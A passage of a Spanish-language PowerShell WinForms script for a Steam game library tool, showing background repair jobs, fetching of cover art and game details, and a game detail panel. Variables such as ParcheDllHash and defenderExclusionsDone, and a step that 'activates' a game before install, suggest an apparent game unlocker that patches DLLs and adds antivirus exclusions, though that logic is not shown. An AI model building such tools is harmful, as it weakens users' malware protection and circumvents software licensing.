        INSTALL_FOLDER_MAP=$script:INSTALL_FOLDER_MAP
        bibFixesCache=$null
        bibFixesCacheTime=[datetime]::MinValue
        bibFixesCacheLoaded=$false
        bibRepairProgress=$script:bibRepairProgress
        ParcheDllHash=$script:ParcheDllHash
        utf8NoBom=$script:utf8NoBom
        version=$script:version
        phaseFile=$script:phaseFile
        serverUrl=$script:serverUrl
        serverUrlCf=$script:serverUrlCf
        clientId=$script:clientId
        lastUrlOk=$script:lastUrlOk
        patchSilentOK=$script:patchSilentOK
        defenderExclusionsDone=$script:defenderExclusionsDone
    }
    foreach($vn in $workerVars.Keys){
        try {
            $ve=New-Object System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $vn,$workerVars[$vn],'Repair worker state'
            $iss.Variables.Add($ve)
        } catch {}
    }
    $pool=[RunspaceFactory]::CreateRunspacePool($iss)
    try{$pool.SetMaxRunspaces(1)|Out-Null;$pool.SetMinRunspaces(1)|Out-Null}catch{}
    $pool.Open()
    $script:bibRepairPool=$pool
}
function Start-BiblioRepairAsync([string]$appid) {
    if(-not $script:bibRepairProgress){$script:bibRepairProgress=[hashtable]::Synchronized(@{text='Preparando reparacion...'})}
    if(-not $script:bibRepairPool){New-BiblioRepairPool}
    if($script:bibRepairJob){throw 'Ya hay una reparacion en curso'}
    $script:bibRepairProgress['text']='Iniciando reparacion...'
    $ps=[PowerShell]::Create()
    $ps.RunspacePool=$script:bibRepairPool
    [void]$ps.AddScript({param($id);Repair-BiblioGame $id}).AddArgument([string]$appid)
    $handle=$ps.BeginInvoke()
    $script:bibRepairJob=@{ps=$ps;h=$handle;appid=[string]$appid}
    if(-not $script:bibRepairTimer){
        $script:bibRepairTimer=New-Object System.Windows.Forms.Timer
        $script:bibRepairTimer.Interval=180
        $script:bibRepairTimer.Add_Tick({
            try {
                if($script:bibRepairProgress -and $script:bibRepairProgress['text']){$script:bdtStatus.Text=[string]$script:bibRepairProgress['text']}
                $job=$script:bibRepairJob
                if(-not $job){$script:bibRepairTimer.Stop();return}
                if(-not $job.h.IsCompleted){return}
                $result=$null;$workerError=''
                try{$values=@($job.ps.EndInvoke($job.h));if($values.Count -gt 0){$result=$values[$values.Count-1]}}catch{$workerError=$_.Exception.Message}
                try{$job.ps.Dispose()}catch{}
                $script:bibRepairJob=$null
$script:bdtRepBusy=$false
$script:bdtInstBusy=$false
                $script:bdtRep.Enabled=$true
                $script:bdtRep.Tag.Text='REPARAR JUEGO'
                $script:bdtRep.Invalidate()
                if(-not $result){$result=@{ok=$false;msg=$(if($workerError){$workerError}else{'La reparacion no devolvio resultado'})}}
                if($result.ok){
                    $script:bdtStatus.Text='Juego reparado.'
                    if($script:bdtp.Visible -and $form.WindowState -ne 'Minimized'){[System.Windows.Forms.MessageBox]::Show('Juego reparado. Reinicia Steam.','Reparar','OK','Information')}
                } else {
                    $script:bdtStatus.Text='Este juego no requiere reparacion.'
                    if($script:bdtp.Visible -and $form.WindowState -ne 'Minimized'){[System.Windows.Forms.MessageBox]::Show('Este juego no requiere reparacion.','Reparar','OK','Information')}
                }
                $script:bibRepairTimer.Stop()
            } catch {
                try{$script:bdtRepBusy=$false;$script:bdtRep.Enabled=$true;$script:bdtRep.Tag.Text='REPARAR JUEGO';$script:bdtRep.Invalidate()}catch{}
                try{$script:bdtStatus.Text='Error: '+$_.Exception.Message}catch{}
                try{$script:bibRepairTimer.Stop()}catch{}
            }
        })
    }
    $script:bibRepairTimer.Start()
    return $true
}
function Set-BdtDescriptionLayout {
    if (-not $script:bdtDesc -or -not $script:bdtDescViewport) { return }
    $width = [Math]::Max(80,[int]$script:bdtDescViewport.ClientSize.Width)
    $script:bdtDesc.Width = $width
    $flags = [System.Windows.Forms.TextFormatFlags]::WordBreak -bor [System.Windows.Forms.TextFormatFlags]::TextBoxControl -bor [System.Windows.Forms.TextFormatFlags]::NoPadding
    $measure = [System.Windows.Forms.TextRenderer]::MeasureText([string]$script:bdtDesc.Text,$script:bdtDesc.Font,(New-Object System.Drawing.Size($width,10000)),$flags)
    $height = [Math]::Max([int]$script:bdtDescViewport.ClientSize.Height,[int]$measure.Height+8)
    $script:bdtDesc.Height = $height
    Set-DarkScrollRange $script:bdtDescScroll ([Math]::Max(0,$height-$script:bdtDescViewport.ClientSize.Height)) $script:bdtDescViewport.ClientSize.Height
    $script:bdtDesc.Location = New-Object System.Drawing.Point(0,-[int]$script:bdtDescScroll.Tag.Value)
}
function Set-BiblioDetailCover([string]$path) {
    if (-not $path -or -not (Test-Path -LiteralPath $path)) { return }
    try {
        $img = [System.Drawing.Image]::FromFile($path)
        $copy = New-Object System.Drawing.Bitmap($img)
        $img.Dispose()
        if ($script:bdtCap.Image) { $old=$script:bdtCap.Image; $script:bdtCap.Image=$null; $old.Dispose() }
        $script:bdtCap.Image = $copy
        if ($script:bdtCapPlaceholder) { $script:bdtCapPlaceholder.Visible = $false }
    } catch {}
}
function Apply-BiblioDetailData($data) {
    if (-not $data -or [string]$data.appid -ne [string]$script:bdtAid) { return }
    if ($data.name -and ([string]$script:bdtTitle.Text -like 'AppID *')) { $script:bdtTitle.Text=[string]$data.name }
    if ($data.description) { $script:bdtDesc.Text=[string]$data.description } else { $script:bdtDesc.Text='Sin descripcion disponible.' }
    if ($data.releaseDate) { $script:bdtFechaV.Text=[string]$data.releaseDate }
    if ($data.developers) { $script:bdtDevV.Text=(@($data.developers) -join ', ') }
    if ($data.publishers) { $script:bdtPubV.Text=(@($data.publishers) -join ', ') }
    $genres=@($data.genres); if($genres.Count -gt 0){$script:bdtTagV.Text=($genres -join ', ')}
    for($i=0;$i -lt 4;$i++){ $script:bdtCatT[$i].Text=''; if($i -lt @($data.categories).Count){$script:bdtCatT[$i].Text=[string]$data.categories[$i]} }
    $pl='Steam'; if($genres.Count -gt 0){$pl+='   |   '+($genres -join '   |   ')}
    $script:bdtPlat.Text=$pl+'      |      '+$script:bdtEst
    Set-BdtDescriptionLayout
}
function Start-BiblioDetailJobs([string]$appid) {
    try {
        foreach ($job in @($script:bibDetailJobs)) { try { $job.ps.Stop() } catch {}; try { $job.ps.Dispose() } catch {} }
        $script:bibDetailJobs = @()
        if (-not $script:bibDetailPool) { $script:bibDetailPool=[RunspaceFactory]::CreateRunspacePool(1,2); $script:bibDetailPool.Open() }
        $coverDir = Join-Path $env:TEMP 'bsmap_covers'
        $headerPath = Join-Path $coverDir ($appid+'_hero.jpg')
        if (-not (Test-Path -LiteralPath $headerPath)) {
            $psH=[PowerShell]::Create();$psH.RunspacePool=$script:bibDetailPool
            [void]$psH.AddScript({ param($id,$dir,$path); $r=@{kind='header';appid=$id;ok=$false;path=$path}; try { if(-not(Test-Path -LiteralPath $dir)){New-Item -ItemType Directory -Path $dir -Force|Out-Null}; Invoke-WebRequest -Uri ('https://cdn.cloudflare.steamstatic.com/steam/apps/'+$id+'/hero_capsule.jpg') -OutFile ($path+'.part') -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop; if((Test-Path -LiteralPath ($path+'.part')) -and (Get-Item -LiteralPath ($path+'.part')).Length -gt 1000){Move-Item -LiteralPath ($path+'.part') -Destination $path -Force;$r.ok=$true} } catch { try{Remove-Item -LiteralPath ($path+'.part') -Force -ErrorAction SilentlyContinue}catch{} }; return $r }).AddArgument($appid).AddArgument($coverDir).AddArgument($headerPath)
            $script:bibDetailJobs += @{kind='header';appid=$appid;ps=$psH;h=$psH.BeginInvoke()}
        }
        $apiCache = Join-Path $env:TEMP ('bsmap_biblio_detail_'+$appid+'.json')
        $useCached = $false
        try { if(Test-Path -LiteralPath $apiCache){$fi=Get-Item -LiteralPath $apiCache;if(((Get-Date)-$fi.LastWriteTime).TotalHours -lt 12){$cached=ConvertFrom-Json -InputObject ([System.IO.File]::ReadAllText($apiCache)) -ErrorAction Stop;Apply-BiblioDetailData $cached;$useCached=$true}} } catch {}
        $needsRefresh = $true
        if ($useCached) { try { if(((Get-Date)-(Get-Item -LiteralPath $apiCache).LastWriteTime).TotalMinutes -lt 30){$needsRefresh=$false} } catch {} }
        if ($needsRefresh) {
            $psD=[PowerShell]::Create();$psD.RunspacePool=$script:bibDetailPool
            [void]$psD.AddScript({
                param($id)
                try {
                    $resp=Invoke-RestMethod -Uri ('https://store.steampowered.com/api/appdetails?appids='+$id+'&l=spanish') -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop
                    $entry=$resp.PSObject.Properties[$id].Value
                    if(-not $entry -or -not $entry.success -or -not $entry.data){return @{kind='data';appid=$id;ok=$false}}
                    $d=$entry.data
                    $desc='';if($d.short_description){$desc=[System.Net.WebUtility]::HtmlDecode(([string]$d.short_description -replace '<[^>]+>','')).Trim()}
                    $genres=@();if($d.genres){$genres=@($d.genres|ForEach-Object{[string]$_.description})}
                    $categories=@();if($d.categories){$categories=@($d.categories|Select-Object -First 4|ForEach-Object{[string]$_.description})}
                    $date='';if($d.release_date -and $d.release_date.date){$date=[string]$d.release_date.date}
                    return @{kind='data';appid=$id;ok=$true;name=[string]$d.name;description=$desc;releaseDate=$date;developers=@($d.developers);publishers=@($d.publishers);genres=$genres;categories=$categories}
                } catch { return @{kind='data';appid=$id;ok=$false} }
            }).AddArgument($appid)
            $script:bibDetailJobs += @{kind='data';appid=$appid;cache=$apiCache;ps=$psD;h=$psD.BeginInvoke()}
        }
        if (-not $script:bibDetailTimer) {
            $script:bibDetailTimer=New-Object System.Windows.Forms.Timer
            $script:bibDetailTimer.Interval=250
            $script:bibDetailTimer.Add_Tick({
                $alive=@()
                foreach($job in @($script:bibDetailJobs)){
                    if(-not $job.h.IsCompleted){$alive+=$job;continue}
                    $result=$null
                    try{$out=@($job.ps.EndInvoke($job.h));if($out.Count -gt 0){$result=$out[$out.Count-1]}}catch{}
                    if($result -and [string]$result.appid -eq [string]$script:bdtAid -and $script:bdtp.Visible){
                        if($job.kind -eq 'header' -and $result.ok){Set-BiblioDetailCover ([string]$result.path)}
                    elseif($job.kind -eq 'data' -and $result.ok){Apply-BiblioDetailData $result;try{[System.IO.File]::WriteAllText([string]$job.cache,(ConvertTo-Json -InputObject $result -Depth 5 -Compress),(New-Object System.Text.UTF8Encoding $false))}catch{}}
                    elseif($job.kind -eq 'data' -and -not $result.ok){if([string]$script:bdtDesc.Text -like 'Cargando*'){$script:bdtDesc.Text='Sin descripcion disponible.';Set-BdtDescriptionLayout}}
                    }
                    try{$job.ps.Dispose()}catch{}
                }
                $script:bibDetailJobs=$alive
                if($alive.Count -eq 0){$script:bibDetailTimer.Stop()}
            })
        }
        if ($script:bibDetailJobs.Count -gt 0) { $script:bibDetailTimer.Start() }
    } catch {}
}
function Show-BiblioDetail($g) {
    if (-not $g) { return }
    try { Stop-BiblioDlWatch } catch {}
    try { $script:bibTimer.Stop() } catch {}
    $script:mp.Visible=$false;$script:rp.Visible=$false;$script:sp.Visible=$false;if($script:cdp){$script:cdp.Visible=$false};$script:bibp.Visible=$false
    $aid=[string]$g.appid; $nm=[string]$g.name
    $script:bdtAid=$aid
    if ($script:bdtCap.Image) { $old=$script:bdtCap.Image; $script:bdtCap.Image=$null; try{$old.Dispose()}catch{} }
    $script:bdtTitle.Text=$nm
    $script:bdtDesc.Text='Cargando informacion...'
    $script:bdtPlat.Text='Steam'
    $script:bdtStatus.Text=''
    $script:bdtFechaV.Text='-';$script:bdtDevV.Text='-';$script:bdtPubV.Text='-';$script:bdtTagV.Text='-'
    for($i=0;$i -lt 4;$i++){ try{$script:bdtCatT[$i].Text=''}catch{} }
    $inst=Test-BiblioInstalled $aid; $lua=Test-BiblioLua $aid
    $est='No instalado'; if($inst){$est='Instalado'}; if($lua){$est+=' | Activado'}else{$est+=' | Sin activar'}
    $script:bdtEst=$est
    $script:bdtPlay.Tag.Text='JUGAR';$script:bdtPlayUrl='steam://rungameid/'+$aid;$script:bdtPlay.Invalidate()
    $script:bdtInstUrl='steam://install/'+$aid
    $script:bdtStoreUrl='https://store.steampowered.com/app/'+$aid
    $headerPath=Join-Path (Join-Path $env:TEMP 'bsmap_covers') ($aid+'_hero.jpg')
    if(Test-Path -LiteralPath $headerPath){Set-BiblioDetailCover $headerPath}else{$cp=Get-BiblioCoverPath $aid;if($cp){Set-BiblioDetailCover $cp}}
    if($script:bdtCapPlaceholder){$script:bdtCapPlaceholder.Tag.GameName=$nm;$script:bdtCapPlaceholder.Visible=(-not $script:bdtCap.Image);$script:bdtCapPlaceholder.Invalidate()}
    try {
        $cw=$form.ClientSize.Width
        $capW=460; if($cw -lt 1000){$capW=[int]($cw*0.44)}
        $tx=($PAD+$capW+24); $colW=280
        $midW=($cw-$tx-$PAD-$colW-24); if($midW -lt 200){$midW=200}
        $colX=($cw-$PAD-$colW)
        $script:bdtCap.Location=New-Object System.Drawing.Point($PAD,52);$script:bdtCap.Size=New-Object System.Drawing.Size($capW,215)
        if($script:bdtCapPlaceholder){$script:bdtCapPlaceholder.Location=$script:bdtCap.Location;$script:bdtCapPlaceholder.Size=$script:bdtCap.Size}
        $script:bdtTitle.Location=New-Object System.Drawing.Point($tx,58);$script:bdtTitle.Size=New-Object System.Drawing.Size($midW,72)
        $script:bdtPlat.Location=New-Object System.Drawing.Point($tx,134);$script:bdtPlat.Size=New-Object System.Drawing.Size($midW,26)
        $script:bdtInfoH.Location=New-Object System.Drawing.Point($tx,166);$script:bdtInfoH.Size=New-Object System.Drawing.Size($midW,28)
        $descW=[Math]::Max(120,$midW-18)
        $script:bdtDescViewport.Location=New-Object System.Drawing.Point($tx,196);$script:bdtDescViewport.Size=New-Object System.Drawing.Size($descW,150)
        $script:bdtDescScroll.Location=New-Object System.Drawing.Point(($tx+$descW+3),196);$script:bdtDescScroll.Size=New-Object System.Drawing.Size(14,150)
        $script:bdtFechaC.Location=New-Object System.Drawing.Point($colX,58);$script:bdtFechaV.Location=New-Object System.Drawing.Point($colX,80)
        $script:bdtDevC.Location=New-Object System.Drawing.Point($colX,116);$script:bdtDevV.Location=New-Object System.Drawing.Point($colX,138)
        $script:bdtPubC.Location=New-Object System.Drawing.Point($colX,174);$script:bdtPubV.Location=New-Object System.Drawing.Point($colX,196)
        $script:bdtTagC.Location=New-Object System.Drawing.Point($colX,232);$script:bdtTagV.Location=New-Object System.Drawing.Point($colX,254);$script:bdtTagV.Size=New-Object System.Drawing.Size($colW,80)
        $stripY=372; $stripW=[int](($cw-2*$PAD)/4)
        for($i=0;$i -lt 4;$i++){ $script:bdtCatT[$i].Location=New-Object System.Drawing.Point(($PAD+$i*$stripW+12),$stripY); $script:bdtCatT[$i].Size=New-Object System.Drawing.Size(($stripW-24),52) }
        $script:bdtPlay.Location=New-Object System.Drawing.Point($PAD,452);$script:bdtInst.Location=New-Object System.Drawing.Point(($PAD+260),452);$script:bdtRep.Location=New-Object System.Drawing.Point(($PAD+520),452);$script:bdtStore.Location=New-Object System.Drawing.Point(($PAD+770),452)
        $script:bdtUninst.Location=New-Object System.Drawing.Point($PAD,512);$script:bdtDel.Location=New-Object System.Drawing.Point(($PAD+260),512)
        $script:bdtStatus.Location=New-Object System.Drawing.Point($PAD,566);$script:bdtStatus.Size=New-Object System.Drawing.Size(($cw-2*$PAD),24)
        Set-BdtDescriptionLayout
    } catch {}
    $script:bdtp.Visible=$true
    Start-BiblioDetailJobs $aid
}
function Switch-BackToBiblio{try{Stop-BiblioDlWatch}catch{};try{$script:bdtp.Visible=$false}catch{};$script:bibp.Visible=$true;try{if(($script:bibCoverJobs -and $script:bibCoverJobs.Count -gt 0) -or ($script:bibCoverQueue -and $script:bibCoverQueue.Count -gt 0)){$script:bibTimer.Start()}}catch{}}
$script:bdtp=New-BufferedPanel
$script:bdtp.Location=New-Object System.Drawing.Point(0,$CY)
$script:bdtp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:bdtp.BackColor=$BG;$script:bdtp.Visible=$false
$script:bdtp.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Bottom -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtBack=New-BibBackButton {Switch-BackToBiblio}
$script:bdtBack.Location=New-Object System.Drawing.Point($PAD,10)
$script:bdtp.Controls.Add($script:bdtBack)
$script:bdtCap=New-Object System.Windows.Forms.PictureBox
$script:bdtCap.Location=New-Object System.Drawing.Point($PAD,52)
$script:bdtCap.Size=New-Object System.Drawing.Size(460,215)
$script:bdtCap.SizeMode=[System.Windows.Forms.PictureBoxSizeMode]::Zoom
$script:bdtCap.BackColor=$script:CardBG
$script:bdtp.Controls.Add($script:bdtCap)
$script:bdtCapPlaceholder=New-BufferedPanel
$script:bdtCapPlaceholder.Location=$script:bdtCap.Location;$script:bdtCapPlaceholder.Size=$script:bdtCap.Size
$script:bdtCapPlaceholder.BackColor=$script:CardBG
$script:bdtCapPlaceholder.Tag=@{GameName=''}
$script:bdtCapPlaceholder.Add_Paint({param($s,$e);Draw-BiblioPlaceholder $e.Graphics $s.Width $s.Height ([string]$s.Tag.GameName) $false})
$script:bdtCapPlaceholder.Visible=$true
$script:bdtp.Controls.Add($script:bdtCapPlaceholder)
$script:bdtTitle=New-Object System.Windows.Forms.Label
$script:bdtTitle.Font=New-Object System.Drawing.Font("Bahnschrift SemiBold",24,[System.Drawing.FontStyle]::Bold)
$script:bdtTitle.ForeColor=$script:White;$script:bdtTitle.BackColor=$BG
$script:bdtTitle.Location=New-Object System.Drawing.Point(502,58);$script:bdtTitle.Size=New-Object System.Drawing.Size(500,72)
$script:bdtTitle.AutoEllipsis=$true
$script:bdtTitle.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtTitle)
$script:bdtPlat=New-Object System.Windows.Forms.Label
$script:bdtPlat.ForeColor=[System.Drawing.Color]::FromArgb(140,150,165);$script:bdtPlat.BackColor=$BG
$script:bdtPlat.Font=$script:FntSub
$script:bdtPlat.Location=New-Object System.Drawing.Point(502,134);$script:bdtPlat.Size=New-Object System.Drawing.Size(500,26)
$script:bdtPlat.AutoEllipsis=$true
$script:bdtPlat.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtPlat)
$script:bdtInfoH=New-Object System.Windows.Forms.Label
$script:bdtInfoH.Text="Informacion general"
$script:bdtInfoH.Font=New-Object System.Drawing.Font("Bahnschrift SemiBold",14,[System.Drawing.FontStyle]::Bold)
$script:bdtInfoH.ForeColor=$script:White;$script:bdtInfoH.BackColor=$BG
$script:bdtInfoH.Location=New-Object System.Drawing.Point(502,166);$script:bdtInfoH.Size=New-Object System.Drawing.Size(500,28)
$script:bdtInfoH.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtInfoH)
$script:bdtDescViewport=New-BufferedPanel
$script:bdtDescViewport.Location=New-Object System.Drawing.Point(502,196);$script:bdtDescViewport.Size=New-Object System.Drawing.Size(482,150)
$script:bdtDescViewport.BackColor=$BG
$script:bdtDescViewport.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtDescViewport)
$script:bdtDesc=New-Object System.Windows.Forms.Label
$script:bdtDesc.AutoSize=$false;$script:bdtDesc.UseCompatibleTextRendering=$true
$script:bdtDesc.BackColor=$BG;$script:bdtDesc.ForeColor=[System.Drawing.Color]::FromArgb(175,185,200)
$script:bdtDesc.Font=$script:FntSub;$script:bdtDesc.Text=''
$script:bdtDesc.Location=New-Object System.Drawing.Point(0,0);$script:bdtDesc.Size=New-Object System.Drawing.Size(482,150)
$script:bdtDescViewport.Controls.Add($script:bdtDesc)
$script:bdtDescScroll=New-DarkScrollBar { param($v); if($script:bdtDesc){$script:bdtDesc.Location=New-Object System.Drawing.Point(0,-[int]$v)} }
$script:bdtDescScroll.Location=New-Object System.Drawing.Point(988,196);$script:bdtDescScroll.Size=New-Object System.Drawing.Size(14,150)
$script:bdtDescScroll.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtDescScroll)
$script:bdtDescWheel={param($s,$e);if($script:bdtDescScroll -and $script:bdtDescScroll.Tag.Maximum -gt 0){$step=[Math]::Max(45,[int]($script:bdtDescViewport.ClientSize.Height/4));$value=[int]$script:bdtDescScroll.Tag.Value;if($e.Delta -gt 0){$value-=$step}else{$value+=$step};Set-DarkScrollValue $script:bdtDescScroll $value}}
$script:bdtDescViewport.Add_MouseWheel($script:bdtDescWheel);$script:bdtDesc.Add_MouseWheel($script:bdtDescWheel)
$script:bdtFechaC=New-Object System.Windows.Forms.Label
$script:bdtFechaC.Text="Fecha de lanzamiento";$script:bdtFechaC.ForeColor=[System.Drawing.Color]::FromArgb(120,130,145);$script:bdtFechaC.BackColor=$BG;$script:bdtFechaC.Font=$script:FntSub
$script:bdtFechaC.Location=New-Object System.Drawing.Point(1100,58);$script:bdtFechaC.Size=New-Object System.Drawing.Size(280,20)
$script:bdtFechaC.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtFechaC)
$script:bdtFechaV=New-Object System.Windows.Forms.Label
$script:bdtFechaV.ForeColor=$script:White;$script:bdtFechaV.BackColor=$BG;$script:bdtFechaV.Font=$script:FntSub
$script:bdtFechaV.Location=New-Object System.Drawing.Point(1100,80);$script:bdtFechaV.Size=New-Object System.Drawing.Size(280,24)
$script:bdtFechaV.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtFechaV)
$script:bdtDevC=New-Object System.Windows.Forms.Label
$script:bdtDevC.Text="Desarrollador";$script:bdtDevC.ForeColor=[System.Drawing.Color]::FromArgb(120,130,145);$script:bdtDevC.BackColor=$BG;$script:bdtDevC.Font=$script:FntSub
$script:bdtDevC.Location=New-Object System.Drawing.Point(1100,116);$script:bdtDevC.Size=New-Object System.Drawing.Size(280,20)
$script:bdtDevC.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtDevC)
$script:bdtDevV=New-Object System.Windows.Forms.Label
$script:bdtDevV.ForeColor=$script:White;$script:bdtDevV.BackColor=$BG;$script:bdtDevV.Font=$script:FntSub
$script:bdtDevV.Location=New-Object System.Drawing.Point(1100,138);$script:bdtDevV.Size=New-Object System.Drawing.Size(280,24)
$script:bdtDevV.AutoEllipsis=$true
$script:bdtDevV.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtDevV)
$script:bdtPubC=New-Object System.Windows.Forms.Label
$script:bdtPubC.Text="Editor";$script:bdtPubC.ForeColor=[System.Drawing.Color]::FromArgb(120,130,145);$script:bdtPubC.BackColor=$BG;$script:bdtPubC.Font=$script:FntSub
$script:bdtPubC.Location=New-Object System.Drawing.Point(1100,174);$script:bdtPubC.Size=New-Object System.Drawing.Size(280,20)
$script:bdtPubC.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtPubC)
$script:bdtPubV=New-Object System.Windows.Forms.Label
$script:bdtPubV.ForeColor=$script:White;$script:bdtPubV.BackColor=$BG;$script:bdtPubV.Font=$script:FntSub
$script:bdtPubV.Location=New-Object System.Drawing.Point(1100,196);$script:bdtPubV.Size=New-Object System.Drawing.Size(280,24)
$script:bdtPubV.AutoEllipsis=$true
$script:bdtPubV.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtPubV)
$script:bdtTagC=New-Object System.Windows.Forms.Label
$script:bdtTagC.Text="Etiquetas";$script:bdtTagC.ForeColor=[System.Drawing.Color]::FromArgb(120,130,145);$script:bdtTagC.BackColor=$BG;$script:bdtTagC.Font=$script:FntSub
$script:bdtTagC.Location=New-Object System.Drawing.Point(1100,232);$script:bdtTagC.Size=New-Object System.Drawing.Size(280,20)
$script:bdtTagC.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtTagC)
$script:bdtTagV=New-Object System.Windows.Forms.Label
$script:bdtTagV.ForeColor=$script:White;$script:bdtTagV.BackColor=$BG;$script:bdtTagV.Font=$script:FntSub
$script:bdtTagV.Location=New-Object System.Drawing.Point(1100,254);$script:bdtTagV.Size=New-Object System.Drawing.Size(280,80)
$script:bdtTagV.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bdtp.Controls.Add($script:bdtTagV)
$script:bdtCatT=@()
for($i=0;$i -lt 4;$i++){
    $ct=New-Object System.Windows.Forms.Label
    $ct.Font=New-Object System.Drawing.Font("Bahnschrift SemiBold",12,[System.Drawing.FontStyle]::Bold)
    $ct.ForeColor=$script:White;$ct.BackColor=$BG
    $ct.Location=New-Object System.Drawing.Point(($PAD+$i*300+12),372);$ct.Size=New-Object System.Drawing.Size(276,52)
    $script:bdtp.Controls.Add($ct)
    $script:bdtCatT+=$ct
}
function New-BdtBtn($x,$y,$w,$h,$bg,$hbg,$fg,$bd,$fnt){
    $b=New-BufferedPanel
    $b.Location=New-Object System.Drawing.Point($x,$y)
    $b.Size=New-Object System.Drawing.Size($w,$h)
    $b.BackColor=$BG;$b.Cursor=[System.Windows.Forms.Cursors]::Hand
    $b.Tag=@{Hover=$false;Text="";Bg=$bg;Hbg=$hbg;Fg=$fg;Bd=$bd;Fnt=$fnt}
    $b.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
    $b.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
    $b.Add_Paint({param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $n=$s.Tag;$bc=if($n.Hover){$n.Hbg}else{$n.Bg}
        $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
        $b1=New-Object System.Drawing.SolidBrush($bc)
        $g.FillPath($b1,$p);$b1.Dispose();$p.Dispose()
        if($n.Bd){$b2=New-Object System.Drawing.Pen($n.Bd,1.5);$p2=New-RR 1 1 ($s.Width-3) ($s.Height-3) $CR;$g.DrawPath($b2,$p2);$b2.Dispose();$p2.Dispose()}
        if($n.Text){$tb=New-Object System.Drawing.SolidBrush($n.Fg);$sf=New-Object System.Drawing.StringFormat;$sf.Alignment="Center";$sf.LineAlignment="Center";$g.DrawString($n.Text,$n.Fnt,$tb,(New-Object System.Drawing.RectangleF(0,0,$s.Width,$s.Height)),$sf);$tb.Dispose();$sf.Dispose()}
    })
    return $b
}
$script:bdtPlay=New-BdtBtn $PAD 452 240 50 ([System.Drawing.Color]::FromArgb(27,127,198)) ([System.Drawing.Color]::FromArgb(35,150,225)) ([System.Drawing.Color]::White) $null (New-Object System.Drawing.Font("Bahnschrift SemiBold",14,[System.Drawing.FontStyle]::Bold))
$script:bdtPlay.Tag.Text="JUGAR"
$script:bdtPlayUrl=""
$script:bdtPlay.Add_Click({ try { if($script:bdtPlayUrl){ Start-Process $script:bdtPlayUrl } } catch {} })
$script:bdtp.Controls.Add($script:bdtPlay)
$script:bdtInst=New-BdtBtn ($PAD+260) 452 240 50 $script:CardBG $script:CardHover $script:White $script:Cyan (New-Object System.Drawing.Font("Bahnschrift SemiBold",14,[System.Drawing.FontStyle]::Bold))
$script:bdtInst.Tag.Text="INSTALAR"
$script:bdtInstUrl=""
$script:bdtInst.Add_Click({ try {
    if($script:bdtInstBusy){return}; $a=$script:bdtAid; if(-not $a){return}
    if(Test-BiblioLua $a){ try{ Start-Process "steam://install/$a" }catch{}; $script:bdtStatus.Text="Instalacion iniciada en Steam..."; Start-BiblioDlWatch $a; return }
    $script:bdtInstBusy=$true
    $script:bdtStatus.Text="Activando el juego antes de instalar..."; $form.Refresh(); [System.Windows.Forms.Application]::DoEvents()
    $rr=Activate-BiblioGame $a
    $script:bdtInstBusy=$false
    if($rr.ok){ $script:bdtStatus.Text="Activado, abriendo instalacion..."; $form.Refresh(); [System.Windows.Forms.Application]::DoEvents(); try{ Start-Process "steam://install/$a" }catch{}; Start-BiblioDlWatch $a }
    else { $script:bdtStatus.Text="No se pudo activar el juego."; [System.Windows.Forms.MessageBox]::Show("No se pudo activar el juego.","Instalar","OK","Warning") }
} catch { try{$script:bdtInstBusy=$false}catch{}; try{[System.Windows.Forms.MessageBox]::Show(("Error: "+$_.Exception.Message),"Instalar","OK","Warning")}catch{} } })
$script:bdtp.Controls.Add($script:bdtInst)
$script:bdtRep=New-BdtBtn ($PAD+520) 452 230 50 $script:CardBG $script:CardHover $script:White $script:Cyan $script:FntCard
$script:bdtRep.Tag.Text="REPARAR JUEGO"
$script:bdtRepBusy=$false
$script:bdtRep.Add_Click({ try {
    if($script:bdtRepBusy){return}; $a=$script:bdtAid; if(-not $a){return}
    $script:bdtRepBusy=$true
    $script:bdtRep.Enabled=$false
    $script:bdtRep.Tag.Text='REPARANDO...'
    $script:bdtRep.Invalidate()
    $script:bdtStatus.Text='Buscando reparacion...'
